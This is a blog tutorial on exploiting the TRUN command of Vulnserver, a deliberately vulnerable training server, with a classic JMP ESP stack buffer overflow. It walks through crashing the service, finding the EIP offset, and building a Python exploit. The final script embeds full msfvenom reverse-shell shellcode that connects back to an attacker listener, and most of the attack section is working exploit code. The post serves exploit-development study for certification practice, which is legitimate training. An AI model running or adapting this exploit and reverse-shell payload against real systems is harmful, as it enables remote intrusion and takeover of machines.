---
layout: single
title: Classic JMP ESP buffer overflow exploitation - remote overflow in Vulnserver
---

This post covers the beginning of any exploit developers' journey, the classic buffer overflow exploitation. 

This post covers the exploitation of the Vulnererver TRUN command, utilizing a JMP ESP and EIP overwrite to obtain remote code execution on a system.

## Introduction - what is a buffer overflow?

So what exactly is a buffer overflow vulnerability? A buffer overflow vulnerability is a software programming error that occurs commonly in C, and c++  applications when the software author uses insecure functions.  A buffer overflow vulnerability is where an input function is not validating the amount of user input that is given, which will allow a user to give too much the data that can then overwrite the buffer sized amount that is designated for the input, and start writing data onto the stack.

The classic exploitation technique for a standard buffer overflow is to fill up the input buffer, and calculate exactly how much data you need to precisely place a JMP instruction within the EIP  memory register. The EIP memory register is responsible for pointing to the next address that is going to be executed, if the attacker can add a JMP instruction into this EIP register, they can have that JMP instruction point to a malicious payload, a malicious shellcode payload.

## Vulnserver source code audit

Note: If you don't know what Immunity debugger is, check out the first post in this series, linked below. It will help you with setting up Immunity and the Mona.py extension which we will use in this post, it should take just a few minutes.

- [https://fullpwnops.com/immunity-windbg-mona/](https://fullpwnops.com/immunity-windbg-mona/)

While auditing the source code for this application, you can see that the TRUN  command takes user input using the insecure strncpy function, this allows for an attacker to abuse the applications buffer overflow vulnerability.

```c
    } else if (strncmp(RecvBuf, "TRUN ", 5) == 0) {
        char *TrunBuf = malloc(3000);
        memset(TrunBuf, 0, 3000);
        for (i = 5; i < RecvBufLen; i++) {
            if ((char)RecvBuf[i] == '.') {
                strncpy(TrunBuf, RecvBuf, 3000); // <----------- vulnerable function!
                Function3(TrunBuf);
                break;
            }
        }
```

## Running vulnserver

Start running the vulnserver application, make sure your firewall is configured to allow this local connection. 

![vulnserver 1](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/vulnserver/vulnserver1.png)

First, a basic nc connection to the victim machine on port 9999 shows that Vulnserver is actively running.

![vulnserver 2](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/vulnserver/vulnserver2.png)

Use Immunity debugger and attach the running vulnserver application to it, this will allow you to monitor and fully get a grasp on the application being exploited.

![vulnserver 3](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/vulnserver/vulnserver3.png)

## Crash the application with Python

With the vulnserver application running on port 9999 on the victim host target, you can use a basic python socket connection to send data to this command.

```python
import socket

victim_host = "10.0.0.161"
port = 9999

payload = "A" * 4000    # data to crash the application
buffer_exploit = "TRUN /.:/" + payload # the command to community with our application

# socket connection to the program's port
expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((victim_host, port))
expl.send(buffer_exploit)

print("[x] Sent TRUN + malicious payload to the victim")
print("[!] You may need to send it multiple times")
expl.close()
```
After you send the vulnerable application the buffer of A's, you can observe the application crashing. The overwritten registers show this is being successfully exploited.

![vulnserver 4](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/vulnserver/vulnserver4.png)

Now that we can confirm it is vulnerable to a classic EIP overwritten buffer overflow, we need to figure out exactly how big the buffer size is when we write data into the program, it crashes with 4000 bytes, but how big is the buffer? 

If we can determine how big the buffer is, we can fill it up, and the next data after it will be written into the EIP registers (4 bytes), which we need to control.

## Calculate the input buffer size

We can use the pattern_create tool from Metasploit, this creates a unique pattern every few bytes, if we crash the program with this, we can see exactly where the EIP register has been overwritten.

```
└─▪ ./pattern_create.rb -l 4000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6.........
```

Send this unique string to the application instead of all A's

![vulnserver 5](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/vulnserver/vulnserver5.png)

Now you can see the EIP register has been overwritten with 386F4337, this is a section of the unique pattern we sent, you can use the mona.py Immunity debugger extension as set up in the previous post (https://fullpwnops.com/immunity-windbg-mona/) to calculate this buffer size.

Use the command `!mona findmsp` to have mona calculate exactly how much data it took to overwrite the EIP register.

![vulnserver 6](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/vulnserver/vulnserver6.png)

Now we know it took exactly 2003 bytes to fill up the input buffer, so if we send 2007 bytes, the 4 bytes after the buffer are going to overwrite the EIP register.

Add this to our exploit script.

```python
import socket

victim_host = "10.0.0.161"
port = 9999

payload = "A" * 2003 # calculated buffer
payload += "B" * 4   # control EIP with 4 B's , translated into 41 in hex

buffer_exploit = "TRUN /.:/" + payload

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((victim_host, port))
expl.send(buffer_exploit)

print("[x] Sent TRUN + malicious payload to the victim")
print("[!] You may need to send it multiple times")
expl.close()
```

## Control EIP

Now when you re-send your exploit to the application, you can see the EIP register is now 42424242, which is our 4 B's send after our A's, we control the EIP register!

![vulnserver 7](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/vulnserver/vulnserver7.png)

## JMP to our shellcode

Now that we can control what address gets executed next, we want to find a JMP ESP instruction, which will allow us to jump to our payload (ESP register). 

We can use the command `!mona jmp -r esp` to locate JMP ESP instructions in the application, if there is no JMP ESP, a CALL ESP instruction works just as well.

![vulnserver 8](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/vulnserver/vulnserver8.png)

Now instead of 4 B's, we want to use one of the JMP ESP's addresses instead.

## Note about security mitigations

This vulnerable application has been and has it's .DLLs compiled without ASLR (address space layout randomization) which would randomize addresses like the JMP ESPs we need to use if ASLR is ever enabled, it make exploitation **MUCH** harder, but that is not in-scope for this tutorial.

Note to developers: always compile with ASLR if you can! If makes the attacker's job a lot harder.

We will use the first one that is listed, and since this is a memory address from the application, you need to reverse it, in little-endian format. You can easily do this with the python struct module.

```python
import socket

victim_host = "10.0.0.161"
port = 9999

payload = "A" * 2003  # calculated buffer size
payload += struct.pack("<L", 0x625011AF) # JMP ESP address being converted into little endian format
payload += "C" * 500  # padding to ensure a crash

buffer_exploit = "TRUN /.:/" + payload

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((victim_host, port))
expl.send(buffer_exploit)

print("[x] Sent TRUN + malicious payload to the victim")
print("[!] You may need to send it multiple times")
expl.close()
```
If you run your exploit now, you can see your JMP ESP gets loaded into the EIP register. Now, all we need to do is add a NOPSLED after our JMP, a NOPSLED is comprised of the NOP instruction in assembly, denoted by its 0x90 opcode. This will allow for a clean jump, where our JMP ESP will land in a NOPSLED and cleanly move down the execution chain to our shellcode's first address.

## Generate shellcode

We will use a reverse shell payload generated from msfvenom

```python
# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.78 LPORT=4444 -b "\x00" -v shellcode -f c -f python

shellcode =  "" # shellcode without \x00 as a bad character
shellcode += "\xbb\xe8\x37\x7b\xfa\xda\xd1\xd9\x74\x24\xf4\x5a"
shellcode += "\x2b\xc9\xb1\x52\x83\xc2\x04\x31\x5a\x0e\x03\xb2"
shellcode += "\x39\x99\x0f\xbe\xae\xdf\xf0\x3e\x2f\x80\x79\xdb"
shellcode += "\x1e\x80\x1e\xa8\x31\x30\x54\xfc\xbd\xbb\x38\x14"
shellcode += "\x35\xc9\x94\x1b\xfe\x64\xc3\x12\xff\xd5\x37\x35"
shellcode += "\x83\x27\x64\x95\xba\xe7\x79\xd4\xfb\x1a\x73\x84"
shellcode += "\x54\x50\x26\x38\xd0\x2c\xfb\xb3\xaa\xa1\x7b\x20"
shellcode += "\x7a\xc3\xaa\xf7\xf0\x9a\x6c\xf6\xd5\x96\x24\xe0"
shellcode += "\x3a\x92\xff\x9b\x89\x68\xfe\x4d\xc0\x91\xad\xb0"
shellcode += "\xec\x63\xaf\xf5\xcb\x9b\xda\x0f\x28\x21\xdd\xd4"
shellcode += "\x52\xfd\x68\xce\xf5\x76\xca\x2a\x07\x5a\x8d\xb9"
shellcode += "\x0b\x17\xd9\xe5\x0f\xa6\x0e\x9e\x34\x23\xb1\x70"
shellcode += "\xbd\x77\x96\x54\xe5\x2c\xb7\xcd\x43\x82\xc8\x0d"
shellcode += "\x2c\x7b\x6d\x46\xc1\x68\x1c\x05\x8e\x5d\x2d\xb5"
shellcode += "\x4e\xca\x26\xc6\x7c\x55\x9d\x40\xcd\x1e\x3b\x97"
shellcode += "\x32\x35\xfb\x07\xcd\xb6\xfc\x0e\x0a\xe2\xac\x38"
shellcode += "\xbb\x8b\x26\xb8\x44\x5e\xe8\xe8\xea\x31\x49\x58"
shellcode += "\x4b\xe2\x21\xb2\x44\xdd\x52\xbd\x8e\x76\xf8\x44"
shellcode += "\x59\x73\xfd\x46\xd7\xeb\xff\x46\xf6\xb7\x76\xa0"
shellcode += "\x92\x57\xdf\x7b\x0b\xc1\x7a\xf7\xaa\x0e\x51\x72"
shellcode += "\xec\x85\x56\x83\xa3\x6d\x12\x97\x54\x9e\x69\xc5"
shellcode += "\xf3\xa1\x47\x61\x9f\x30\x0c\x71\xd6\x28\x9b\x26"
shellcode += "\xbf\x9f\xd2\xa2\x2d\xb9\x4c\xd0\xaf\x5f\xb6\x50"
shellcode += "\x74\x9c\x39\x59\xf9\x98\x1d\x49\xc7\x21\x1a\x3d"
shellcode += "\x97\x77\xf4\xeb\x51\x2e\xb6\x45\x08\x9d\x10\x01"
shellcode += "\xcd\xed\xa2\x57\xd2\x3b\x55\xb7\x63\x92\x20\xc8"
shellcode += "\x4c\x72\xa5\xb1\xb0\xe2\x4a\x68\x71\x12\x01\x30"
shellcode += "\xd0\xbb\xcc\xa1\x60\xa6\xee\x1c\xa6\xdf\x6c\x94"
shellcode += "\x57\x24\x6c\xdd\x52\x60\x2a\x0e\x2f\xf9\xdf\x30"
shellcode += "\x9c\xfa\xf5"
```
When generating shellcode, you need to remove bad characters from the generation process, this can be done first by discovering any bad characters that the application may have, 0x00 is always a bad character, it's a null byte.

## Putting it all together

The order for our code now works like so:

- buffer of "A" * 2004
- JMP ESP instruction 
- NOPSLED
- shellcode

```python
#!/usr/bin/python

import socket

victim_host = "10.0.0.213"
port = 9999

# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.78 LPORT=4444 -b "\x00" -v shellcode -f c -f python

shellcode =  "" # shellcode without \x00 as a bad character
shellcode += "\xbb\xe8\x37\x7b\xfa\xda\xd1\xd9\x74\x24\xf4\x5a"
shellcode += "\x2b\xc9\xb1\x52\x83\xc2\x04\x31\x5a\x0e\x03\xb2"
shellcode += "\x39\x99\x0f\xbe\xae\xdf\xf0\x3e\x2f\x80\x79\xdb"
shellcode += "\x1e\x80\x1e\xa8\x31\x30\x54\xfc\xbd\xbb\x38\x14"
shellcode += "\x35\xc9\x94\x1b\xfe\x64\xc3\x12\xff\xd5\x37\x35"
shellcode += "\x83\x27\x64\x95\xba\xe7\x79\xd4\xfb\x1a\x73\x84"
shellcode += "\x54\x50\x26\x38\xd0\x2c\xfb\xb3\xaa\xa1\x7b\x20"
shellcode += "\x7a\xc3\xaa\xf7\xf0\x9a\x6c\xf6\xd5\x96\x24\xe0"
shellcode += "\x3a\x92\xff\x9b\x89\x68\xfe\x4d\xc0\x91\xad\xb0"
shellcode += "\xec\x63\xaf\xf5\xcb\x9b\xda\x0f\x28\x21\xdd\xd4"
shellcode += "\x52\xfd\x68\xce\xf5\x76\xca\x2a\x07\x5a\x8d\xb9"
shellcode += "\x0b\x17\xd9\xe5\x0f\xa6\x0e\x9e\x34\x23\xb1\x70"
shellcode += "\xbd\x77\x96\x54\xe5\x2c\xb7\xcd\x43\x82\xc8\x0d"
shellcode += "\x2c\x7b\x6d\x46\xc1\x68\x1c\x05\x8e\x5d\x2d\xb5"
shellcode += "\x4e\xca\x26\xc6\x7c\x55\x9d\x40\xcd\x1e\x3b\x97"
shellcode += "\x32\x35\xfb\x07\xcd\xb6\xfc\x0e\x0a\xe2\xac\x38"
shellcode += "\xbb\x8b\x26\xb8\x44\x5e\xe8\xe8\xea\x31\x49\x58"
shellcode += "\x4b\xe2\x21\xb2\x44\xdd\x52\xbd\x8e\x76\xf8\x44"
shellcode += "\x59\x73\xfd\x46\xd7\xeb\xff\x46\xf6\xb7\x76\xa0"
shellcode += "\x92\x57\xdf\x7b\x0b\xc1\x7a\xf7\xaa\x0e\x51\x72"
shellcode += "\xec\x85\x56\x83\xa3\x6d\x12\x97\x54\x9e\x69\xc5"
shellcode += "\xf3\xa1\x47\x61\x9f\x30\x0c\x71\xd6\x28\x9b\x26"
shellcode += "\xbf\x9f\xd2\xa2\x2d\xb9\x4c\xd0\xaf\x5f\xb6\x50"
shellcode += "\x74\x9c\x39\x59\xf9\x98\x1d\x49\xc7\x21\x1a\x3d"
shellcode += "\x97\x77\xf4\xeb\x51\x2e\xb6\x45\x08\x9d\x10\x01"
shellcode += "\xcd\xed\xa2\x57\xd2\x3b\x55\xb7\x63\x92\x20\xc8"
shellcode += "\x4c\x72\xa5\xb1\xb0\xe2\x4a\x68\x71\x12\x01\x30"
shellcode += "\xd0\xbb\xcc\xa1\x60\xa6\xee\x1c\xa6\xdf\x6c\x94"
shellcode += "\x57\x24\x6c\xdd\x52\x60\x2a\x0e\x2f\xf9\xdf\x30"
shellcode += "\x9c\xfa\xf5"

payload  = "A" * 2003 # fill up the buffer after calculating the offset
payload += struct.pack("<L", 0x625011AF) 
payload += "\x90" * 16
payload += shellcode

buffer_exploit = "TRUN /.:/" + payload

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((victim_host, port))
expl.send(buffer_exploit)
print("[x] Sent TRUN + malicious payload to the victim")
print("[!] You may need to send it multiple times")
expl.close()
```

## Obtaining a reverse shell
----

We can catch our incoming reverse shell with nc on our host system.

![vulnserver 9](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/vulnserver/vulnserver9.png)

## Wrapup

We can start by auditing the source code of the vulnserver application, and while debugging it, we can crash it, calculate the buffer size of the user input function, and the use a JMP ESP instruction to JMP into a NOPSLED which hits our shellcode payload, all of this hits triggers our reverse shell payload which we catch with a nc connection listening on our set up local port.

This is great for the OSCP exam, don't be intimidated, but this is usually seen as the easiest and most trivial type of buffer overflow, if you enjoyed this exploitation journey, you may very well be developing a passion for exploit development, I encourage you to check out the next post in this series, and eventually... some of my new and utterly complex and extreme Windows exploits.

Have a great day!
